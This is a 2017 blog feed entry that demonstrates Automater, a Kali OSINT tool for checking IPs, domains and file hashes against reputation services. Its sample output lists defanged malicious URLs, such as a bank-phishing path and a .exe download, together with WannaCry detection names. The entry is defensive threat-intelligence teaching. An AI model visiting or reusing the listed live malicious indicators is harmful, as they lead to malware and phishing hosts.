<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-06-11T05:39:42-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Automater - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/06/11/automater-kali-linux-tools/"/>
    <updated>2017-06-11T03:57:26-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/06/11/automater-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to check suspicious IPs, domains and hashes for maliciousness. Maybe you&rsquo;ve heard that your favorite news site has been hacked and is serving malware to its users. You&rsquo;d like to confirm if something is dangerous or not, without navigating to it and risking to get compromised in the process. There is a Python tool on Kali that can help you with just that! Enter Automater!</p>

<!-- more -->


<p>Homepage: <a href="http://www.tekdefense.com/automater/">http://www.tekdefense.com/automater/</a></p>

<p>If you want to get it on your distro, you can grab it from its <a href="https://github.com/1aN0rmus/TekDefense-Automater">Github repository</a></p>

<h1>Automater description</h1>

<blockquote><p>Automater is a URL/Domain, IP Address, and Md5 Hash OSINT tool aimed at making the analysis process easier for
intrusion Analysts. Given a target (URL, IP, or HASH) or a file full of targets Automater will return relevant
results from sources like the following: IPvoid.com, Robtex.com, Fortiguard.com, unshorten.me, Urlvoid.com,
Labs.alienvault.com, ThreatExpert, VxVault, and VirusTotal.</p></blockquote>

<h1>Automater options</h1>

<p>```
automater -h
usage: Automater.py [-h] [-o OUTPUT] [-b] [-f CEF] [-w WEB] [-c CSV]</p>

<pre><code>                [-d DELAY] [-s SOURCE] [--proxy PROXY] [-a USERAGENT] [-V]
                [-r] [-v]
                target
</code></pre>

<p>IP, URL, and Hash Passive Analysis tool</p>

<p>positional arguments:
  target                List one IP Address (CIDR or dash notation accepted),</p>

<pre><code>                    URL or Hash to query or pass the filename of a file
                    containing IP Address info, URL or Hash to query each
                    separated by a newline.
</code></pre>

<p>optional arguments:
  -h, &mdash;help            show this help message and exit
  -o OUTPUT, &mdash;output OUTPUT</p>

<pre><code>                    This option will output the results to a file.
</code></pre>

<p>  -b, &mdash;bot             This option will output minimized results for a bot.
  -f CEF, &mdash;cef CEF     This option will output the results to a CEF formatted</p>

<pre><code>                    file.
</code></pre>

<p>  -w WEB, &mdash;web WEB     This option will output the results to an HTML file.
  -c CSV, &mdash;csv CSV     This option will output the results to a CSV file.
  -d DELAY, &mdash;delay DELAY</p>

<pre><code>                    This will change the delay to the inputted seconds.
                    Default is 2.
</code></pre>

<p>  -s SOURCE, &mdash;source SOURCE</p>

<pre><code>                    This option will only run the target against a
                    specific source engine to pull associated domains.
                    Options are defined in the name attribute of the site
                    element in the XML configuration file. This can be a
                    list of names separated by a semicolon.
</code></pre>

<p>  &mdash;proxy PROXY         This option will set a proxy to use (eg.</p>

<pre><code>                    proxy.example.com:8080)
</code></pre>

<p>  -a USERAGENT, &mdash;useragent USERAGENT</p>

<pre><code>                    This option allows the user to set the user-agent seen
                    by web servers being utilized. By default, the user-
                    agent is set to Automater/version
</code></pre>

<p>  -V, &mdash;vercheck        This option checks and reports versioning for</p>

<pre><code>                    Automater. Checks each python module in the Automater
                    scope. Default, (no -V) is False
</code></pre>

<p>  -r, &mdash;refreshxml      This option refreshes the tekdefense.xml file from the</p>

<pre><code>                    remote GitHub site. Default (no -r) is False.
</code></pre>

<p>  -v, &mdash;verbose         This option prints messages to the screen. Default (no</p>

<pre><code>                    -v) is False.
</code></pre>

<p>```</p>

<p>You can see there are multiple output options for further processing, like CEF formatted file, CSV and HTML. Also, it&rsquo;s important to remember that tools usually come with their default user agents, and it might be beneficial to change this when you run it, and make it look like a real browser.</p>

<h1>Automater usage</h1>

<ul>
<li>check IP for malware</li>
</ul>


<p>```
automater 185.62.190.110
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: <a href="https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings">https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings</a>
  InsecureRequestWarning)</p>

<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>     Results found for: 185.62.190.110     </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
No results found in the RTex DNS
No results found in the FNet URL
[+] VT ASN: No results found
[+] VT Country: ZZ
[+] VT AS Owner: No results found
[+] VT pDNS: (&lsquo;2016-08-24 00:00:00&rsquo;, &lsquo;cl0.f-aws.com&rsquo;)
[+] VT pDNS: (&lsquo;2017-05-19 00:00:00&rsquo;, &lsquo;mail.attw.io&rsquo;)
[+] VT pDNS: (&lsquo;2016-06-05 00:00:00&rsquo;, &lsquo;weinne.net&rsquo;)
[+] VT pDNS: (&lsquo;2017-02-08 00:00:00&rsquo;, &lsquo;www[.]woodmann.com&rsquo;)
[+] VT Malware: (&lsquo;2017-06-02 10:46:35&rsquo;, &lsquo;ceeca0c7dc341fa57532470f2d7caaa427bf77e1e533b7ff3d9d8e245d6ea5fd&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Corso_2009-2-4_20.20_Corso_7.02.34.rar&rsquo;, &lsquo;2017-06-07 17:23:57&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Vbdec34.zip&rsquo;, &lsquo;2017-06-04 23:44:26&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/tools/&rsquo;, &lsquo;2017-06-02 11:41:58&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/tools/dongles/vdog104.zip&rsquo;, &lsquo;2017-06-02 10:46:33&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/archives/bartpak7.rar&rsquo;, &lsquo;2017-06-01 19:35:43&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/bin_de_decompiler_2009-7-18_22.55_de_decompiler_lite.zip|>de_decompiler_lite.exe&rsquo;, &lsquo;2017-06-01 14:57:19&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/Category:RCE_Tools&rsquo;, &lsquo;2017-05-31 09:16:42&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/Category:SoftICE_Extensions&rsquo;, &lsquo;2017-05-27 18:28:27&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/forum/attachment.php?s=d1dedc683453c119989330b5967a2dea&amp;attachmentid=2311&amp;d=1278836882&rsquo;, &lsquo;2017-05-26 20:45:35&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/fravia/exe/cryptpad.exe&rsquo;, &lsquo;2017-05-26 18:00:12&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_LordPE_2010-6-29_3.9_LordPE_1.41_Deluxe_b.zip&rsquo;, &lsquo;2017-05-26 13:50:29&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/LordPE&rsquo;, &lsquo;2017-05-26 13:42:00&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/tools/dongles/admon25.rar&rsquo;, &lsquo;2017-05-25 05:51:39&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/bin_wintruder_2008-10-24_22.21_wintruder.zip&rsquo;, &lsquo;2017-05-24 12:33:31&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Echo_Mirage_2014-1-11_17.28_EchoMirage-3.1.rar&rsquo;, &lsquo;2017-05-24 10:42:52&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Archives/Kgensrcs.zip&rsquo;, &lsquo;2017-05-19 18:39:05&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/bin_zeroadd_2014-5-9_1.29_zeroadd.zip&rsquo;, &lsquo;2017-05-16 08:33:15&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Unpackers/Arm201b1.zip&rsquo;, &lsquo;2017-05-11 22:16:38&rsquo;)
[+] VT Mal URLs: (&ldquo;hxxp://www[.]woodmann.com/collaborative/knowledge/images/bin_stuxnet&rsquo;s_rootkit<em>(mrxnet)</em>into_c++<em>2011-2-6_13.54_mrxnet.rar&rdquo;, &lsquo;2017-05-11 06:28:02&rsquo;)
[+] VT Mal URLs: (&ldquo;hxxp://www[.]woodmann.com/collaborative/knowledge/images/Bin_Stuxnet&rsquo;s_Rootkit</em>(MRxNet)<em>into_C++</em>2011-2-6_13.54_MRxNet.rar&rdquo;, &lsquo;2017-05-10 11:56:48&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/&rsquo;, &lsquo;2017-05-09 13:25:03&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Dongles/Edgehasp.zip&rsquo;, &lsquo;2017-05-09 06:50:13&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/Kernel_Detective&rsquo;, &lsquo;2017-05-07 23:49:45&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/BobSoft/Pages/Plugins/ImmDbg&rsquo;, &lsquo;2017-05-02 19:47:49&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/AdmiralDebilitate&rsquo;, &lsquo;2017-04-29 23:08:33&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tutorials/Nolflex3.htm&rsquo;, &lsquo;2017-04-21 23:28:28&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_ImpREC_2011-7-16_8.11_ImpREC_1.7e.rar&rsquo;, &lsquo;2017-04-20 17:33:51&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/Detect_It_Easy&rsquo;, &lsquo;2017-04-19 22:55:52&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/forum/attachment.php&rsquo;, &lsquo;2017-04-19 21:13:35&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_IIDKing_2007-10-19_23.37_tf23.zip&rsquo;, &lsquo;2017-04-18 10:44:44&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_RTA_2011-9-6_20.52_rta2b2.zip&rsquo;, &lsquo;2017-04-13 08:16:56&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Dongles/Haspdll.zip&rsquo;, &lsquo;2017-04-11 17:42:56&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools&rsquo;, &lsquo;2017-04-10 16:46:49&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Unpackers/ArmStripper01b6.rar&rsquo;, &lsquo;2017-04-10 04:09:19&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php/Echo_Mirage&rsquo;, &lsquo;2017-04-08 16:34:47&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://185.62.190.110/accessroot/arteam/site/download.php?view.331&rsquo;, &lsquo;2017-04-05 05:34:20&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Unpacker_PECompact_2014-1-15_15.34_Unpacker_PECompact.rar&rsquo;, &lsquo;2017-04-02 21:39:34&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/forum/forum.php&rsquo;, &lsquo;2017-03-24 13:36:54&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/Bin_Superkill_2009-6-4_22.16_Superkill-V1.0.zip&rsquo;, &lsquo;2017-03-16 01:02:57&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Wm.zip&rsquo;, &lsquo;2017-03-16 01:02:57&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Cdtools.zip&rsquo;, &lsquo;2017-03-16 01:02:57&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/FLEXlm/Lmv8gen.zip&rsquo;, &lsquo;2017-03-15 18:06:40&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/krobar/collections/tkc/06.zip&rsquo;, &lsquo;2017-03-14 19:32:26&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Archives/Crackmes.zip&rsquo;, &lsquo;2017-03-14 19:32:26&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/knowledge/images/bin_virut.a_malware_analysis_paper_2010-9-3_15.53_virut.a.rar&rsquo;, &lsquo;2017-03-14 14:34:44&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/index.php&rsquo;, &lsquo;2017-03-14 09:22:56&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/krobar/collections/stones.zip&rsquo;, &lsquo;2017-03-11 00:34:59&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/fravia/sources/WINUSER.H&rsquo;, &lsquo;2017-03-08 11:57:20&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/bin_chimprec_2008-6-24_13.59_chimprec.zip|>chimprec.exe&rsquo;, &lsquo;2017-03-08 11:15:11&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/tools/images/&rsquo;, &lsquo;2017-03-03 07:12:55&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/krobar/collections/id-site.zip&rsquo;, &lsquo;2017-02-24 01:16:48&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/collaborative/knowledge/images/Bin_Stuxnet&amp;&rsquo;, &lsquo;2017-02-15 15:19:26&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/BobSoft/Files/Other/PEiD-0.95-20081103.zip&rsquo;, &lsquo;2017-02-15 00:46:58&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://www[.]woodmann.com/crackz/Tools/Miscarc.zip&rsquo;, &lsquo;2017-02-09 14:37:08&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/pack/icepack.mp3.lz&rsquo;, &lsquo;2016-10-09 15:24:40&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/pack/efect.txt.lz&rsquo;, &lsquo;2016-10-09 15:24:40&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/lib/<strong>future</strong>.pyc.lz&rsquo;, &lsquo;2016-10-09 15:24:39&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/miles/mssa3d.m3d.lz&rsquo;, &lsquo;2016-10-09 15:24:39&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/app/normalize.css&rsquo;, &lsquo;2016-10-09 15:24:37&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/bgm/xmas.mp3.lz&rsquo;, &lsquo;2016-10-09 15:24:38&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2sometimes/client/devil.dll.lz&rsquo;, &lsquo;2016-10-09 15:24:37&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2asgard/client/mark/10.tga.lz&rsquo;, &lsquo;2016-09-27 17:36:49&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://cl0.f-aws.com/metin2asgard/client/mark/10_1.tga.lz&rsquo;, &lsquo;2016-09-27 17:34:08&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://185.62.190.110/Deutsche-Bank/db/erfolg.html&rsquo;, &lsquo;2016-03-07 08:56:47&rsquo;)
[+] VT Mal URLs: (&lsquo;hxxp://185.62.190.110/Deutsche-Bank/db/db.php&rsquo;, &lsquo;2016-02-29 13:36:45&rsquo;)
[+] Blacklist from IPVoid: No results found
[+] ISP from IPvoid: No results found
[+] Country from IPVoid: No results found
[+] Malc0de Date: No results found
[+] Malc0de IP: No results found
[+] Malc0de Country: No results found
[+] Malc0de ASN: No results found
[+] Malc0de ASN Name: No results found
[+] Malc0de MD5: No results found
[+] Reputation Authority Score: 50/100
[+] FreeGeoIP Country Name: Netherlands
[+] FreeGeoIP Region Name: No results found
[+] FreeGeoIP City: No results found
[+] FreeGeoIP Zipcode: No results found
[+] FreeGeoIP Latitude: 52.3824
[+] FreeGeoIP Longitude: 4.8995
[+] SANS total target IPs seen: No results found
[+] SANS total packets blocked: No results found
[+] SANS last seen on: No results found
[+] SANS first seen on: No results found
No results found in the THIP
No results found in the TekHP
[+] ProjectHoneypot activity type: No results found
[+] ProjectHoneypot first mail received: No results found
[+] ProjectHoneypot last mail received: No results found
[+] ProjectHoneypot total mails received: No results found
[+] ProjectHoneypot spider first seen: No results found
[+] ProjectHoneypot spider last seen: No results found
[+] ProjectHoneypot spider sightings: No results found
[+] ProjectHoneypot user-agent sightings: No results found
[+] ProjectHoneypot first post on: No results found
[+] ProjectHoneypot last post on: No results found
[+] ProjectHoneypot form posts: No results found
[+] ProjectHoneypot first rule break on: No results found
[+] ProjectHoneypot last rule break on: No results found
[+] ProjectHoneypot rule break sightings: No results found
[+] ProjectHoneypot first dictionary attack on: No results found
[+] ProjectHoneypot last dictionary attack on: No results found
[+] ProjectHoneypot dictionary attack sightings: No results found
[+] ProjectHoneypot harvester first seen: No results found
[+] ProjectHoneypot harvester last seen: No results found
[+] ProjectHoneypot harvester sightings: No results found
[+] ProjectHoneypot harvester results: No results found
```</p>

<p>I&rsquo;ve used the IP of the Woodmann reverse engineering community. From the output, you can see that it&rsquo;s clean, excepting some files flagged by VirusTotal, as would be expected from a place where executable samples are shared for RE :)</p>

<ul>
<li>check domain for malware</li>
</ul>


<p>```
automater corefitness.info
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: <a href="https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings">https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings</a>
  InsecureRequestWarning)</p>

<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>     Results found for: corefitness.info     </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
No results found in the FNet URL
No results found in the Un Redirect
[+] IP from URLVoid: 76.74.155.21
[+] Blacklist from URLVoid: No results found
[+] Domain Age from URLVoid: 2009-12-08 (8 years ago)
[+] Geo Coordinates from URLVoid: 40.6888 / -74.0203
[+] Country from URLVoid:  (US) United States
[+] pDNS data from VirusTotal: (&lsquo;2017-04-02&rsquo;, &lsquo;107.180.51.40&rsquo;)
[+] pDNS data from VirusTotal: (&lsquo;2016-12-14&rsquo;, &lsquo;76.74.155.21&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-06-10&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-06-09&rsquo;, &lsquo;hxxp://corefitness.info/b/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-06-07&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-04-04&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-03-16&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-03-08&rsquo;, &lsquo;hxxp://corefitness.info/workouts/men/arms/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-03-07&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-02-25&rsquo;, &lsquo;hxxp://corefitness.info/workouts/women/arms/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2017-02-05&rsquo;, &lsquo;hxxp://corefitness.info/workouts/men/arms/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2016-12-23&rsquo;, &lsquo;hxxp://corefitness.info/b/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2016-12-22&rsquo;, &lsquo;hxxp://corefitness.info/&rsquo;)
[+] pDNS malicious URLs from VirusTotal: (&lsquo;2016-12-21&rsquo;, &lsquo;hxxp://corefitness.info/1.exe/&rsquo;)
[+] Malc0de Date: No results found
[+] Malc0de IP: No results found
[+] Malc0de Country: No results found
[+] Malc0de ASN: No results found
[+] Malc0de ASN Name: No results found
[+] Malc0de MD5: No results found
No results found in the THIP
[+] McAfee Web Risk: No results found
[+] McAfee Web Category: No results found
[+] McAfee Last Seen: No results found
```</p>

<p>Here I picked a random URL from the <a href="https://isc.sans.edu/feeds/suspiciousdomains_High.txt">SANS suspicious domains list</a>. It seems that if your search for fitness leads you there, your computer won&rsquo;t be very fit D:</p>

<ul>
<li>chech hash for maliciousness</li>
</ul>


<p>```
automater b9318a66fa7f50f2f3ecaca02a96268ad2c63db7554ea3acbde43bf517328d06
/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py:845: InsecureRequestWarning: Unverified HTTPS request is being made. Adding certificate verification is strongly advised. See: <a href="https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings">https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings</a>
  InsecureRequestWarning)</p>

<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>     Results found for: b9318a66fa7f50f2f3ecaca02a96268ad2c63db7554ea3acbde43bf517328d06     </strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>
[+] MD5 found on VT: 1
[+] Scan date submitted: 2017-06-09 04:35:58
[+] Detected Engines: 54
[+] Total Engines: 61
[+] Vendor | Classification: (&lsquo;MicroWorld-eScan&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor.H&rsquo;)
[+] Vendor | Classification: (&lsquo;nProtect&rsquo;, &lsquo;Ransom/W32.WannaCry.Zen&rsquo;)
[+] Vendor | Classification: (&lsquo;CAT-QuickHeal&rsquo;, &lsquo;Ransom.WannaCrypt.A4&rsquo;)
[+] Vendor | Classification: (&lsquo;McAfee&rsquo;, &lsquo;Ransom-WannaCry!4287E15AF619&rsquo;)
[+] Vendor | Classification: (&lsquo;Malwarebytes&rsquo;, &lsquo;Ransom.WannaCrypt&rsquo;)
[+] Vendor | Classification: (&lsquo;Zillya&rsquo;, &lsquo;Trojan.WannaCryptGen.Win32.2&rsquo;)
[+] Vendor | Classification: (&lsquo;SUPERAntiSpyware&rsquo;, &lsquo;Ransom.WannaCrypt/Variant&rsquo;)
[+] Vendor | Classification: (&lsquo;K7GW&rsquo;, &lsquo;Exploit ( 0050d7a31 )&rsquo;)
[+] Vendor | Classification: (&lsquo;K7AntiVirus&rsquo;, &lsquo;Exploit ( 0050d7a31 )&rsquo;)
[+] Vendor | Classification: (&lsquo;Arcabit&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor.H&rsquo;)
[+] Vendor | Classification: (&lsquo;Baidu&rsquo;, &lsquo;Win32.Worm.Rbot.a&rsquo;)
[+] Vendor | Classification: (&lsquo;Cyren&rsquo;, &lsquo;W32/Trojan.ZTSA-8671&rsquo;)
[+] Vendor | Classification: (&lsquo;Symantec&rsquo;, &lsquo;Ransom.Wannacry&rsquo;)
[+] Vendor | Classification: (&lsquo;TrendMicro-HouseCall&rsquo;, &lsquo;Ransom_WCRY.SMB&rsquo;)
[+] Vendor | Classification: (&lsquo;Avast&rsquo;, &lsquo;Win32:WanaCry-A [Trj]&rsquo;)
[+] Vendor | Classification: (&lsquo;Kaspersky&rsquo;, &lsquo;Trojan-Ransom.Win32.Wanna.m&rsquo;)
[+] Vendor | Classification: (&lsquo;BitDefender&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor.H&rsquo;)
[+] Vendor | Classification: (&lsquo;NANO-Antivirus&rsquo;, &lsquo;Trojan.Win32.Wanna.eovgam&rsquo;)
[+] Vendor | Classification: (&lsquo;AegisLab&rsquo;, &lsquo;Troj.Ransom.W32.Wanna.toNz&rsquo;)
[+] Vendor | Classification: (&lsquo;Ad-Aware&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor.H&rsquo;)
[+] Vendor | Classification: (&lsquo;Emsisoft&rsquo;, &lsquo;Trojan-Ransom.WanaCrypt0r (A)&rsquo;)
[+] Vendor | Classification: (&lsquo;Comodo&rsquo;, &lsquo;UnclassifiedMalware&rsquo;)
[+] Vendor | Classification: (&lsquo;F-Secure&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor.H&rsquo;)
[+] Vendor | Classification: (&lsquo;DrWeb&rsquo;, &lsquo;Trojan.Encoder.11432&rsquo;)
[+] Vendor | Classification: (&lsquo;VIPRE&rsquo;, &lsquo;Trojan.Win32.Generic!BT&rsquo;)
[+] Vendor | Classification: (&lsquo;TrendMicro&rsquo;, &lsquo;Ransom_WCRY.SMB&rsquo;)
[+] Vendor | Classification: (&lsquo;McAfee-GW-Edition&rsquo;, &lsquo;Ransom-WannaCry!4287E15AF619&rsquo;)
[+] Vendor | Classification: (&lsquo;Sophos&rsquo;, &lsquo;Troj/Ransom-EMG&rsquo;)
[+] Vendor | Classification: (&lsquo;SentinelOne&rsquo;, &lsquo;static engine &ndash; malicious&rsquo;)
[+] Vendor | Classification: (&lsquo;F-Prot&rsquo;, &lsquo;W32/WannaCrypt.D&rsquo;)
[+] Vendor | Classification: (&lsquo;Jiangmin&rsquo;, &lsquo;Trojan.WanaCry.i&rsquo;)
[+] Vendor | Classification: (&lsquo;Webroot&rsquo;, &lsquo;W32.Ransom.Wannacry&rsquo;)
[+] Vendor | Classification: (&lsquo;Avira&rsquo;, &lsquo;BDS/Agent.ilyda&rsquo;)
[+] Vendor | Classification: (&lsquo;Endgame&rsquo;, &lsquo;malicious (high confidence)&rsquo;)
[+] Vendor | Classification: (&lsquo;Microsoft&rsquo;, &lsquo;Ransom:Win32/WannaCrypt.A!rsm&rsquo;)
[+] Vendor | Classification: (&lsquo;ZoneAlarm&rsquo;, &lsquo;Trojan-Ransom.Win32.Wanna.m&rsquo;)
[+] Vendor | Classification: (&lsquo;ALYac&rsquo;, &lsquo;Trojan.Ransom.WannaCryptor&rsquo;)
[+] Vendor | Classification: (&lsquo;AVware&rsquo;, &lsquo;Trojan.Win32.Generic!BT&rsquo;)
[+] Vendor | Classification: (&lsquo;VBA32&rsquo;, &lsquo;Trojan.Filecoder&rsquo;)
[+] Vendor | Classification: (&lsquo;ESET-NOD32&rsquo;, &lsquo;Win32/Exploit.CVE-2017-0147.A&rsquo;)
[+] Vendor | Classification: (&lsquo;Tencent&rsquo;, &lsquo;Win32.Trojan.Raas.Auto&rsquo;)
[+] Vendor | Classification: (&lsquo;Yandex&rsquo;, &lsquo;Exploit.CVE-2017-0147!&rsquo;)
[+] Vendor | Classification: (&lsquo;Ikarus&rsquo;, &lsquo;Trojan-Ransom.WannaCry&rsquo;)
[+] Vendor | Classification: (&lsquo;Fortinet&rsquo;, &lsquo;W32/WannaCryptor.H!tr&rsquo;)
[+] Vendor | Classification: (&lsquo;AVG&rsquo;, &lsquo;Win32:WanaCry-A [Trj]&rsquo;)
[+] Vendor | Classification: (&lsquo;Panda&rsquo;, &lsquo;Trj/RansomCrypt.I&rsquo;)
[+] Vendor | Classification: (&lsquo;CrowdStrike&rsquo;, &lsquo;malicious_confidence_100% (W)&rsquo;)
[+] Vendor | Classification: (&lsquo;Qihoo-360&rsquo;, &lsquo;HEUR/QVM41.2.2698.Malware.Gen&rsquo;)
[+] Hash found at ThreatExpert: No results found
[+] Malicious Indicators from ThreatExpert: No results found
[+] Date found at VXVault: No results found
[+] URL found at VXVault: No results found
[+] Malc0de Date: No results found
[+] Malc0de IP: No results found
[+] Malc0de Country: No results found
[+] Malc0de ASN: No results found
[+] Malc0de ASN Name: No results found
[+] Malc0de MD5: No results found
No results found in the THMD5
```</p>

<p>I&rsquo;ve grabbed a WannaCry hash and threw it at Automater, you can see it picked it up right away.</p>

<ul>
<li>HTML report of a scan</li>
</ul>


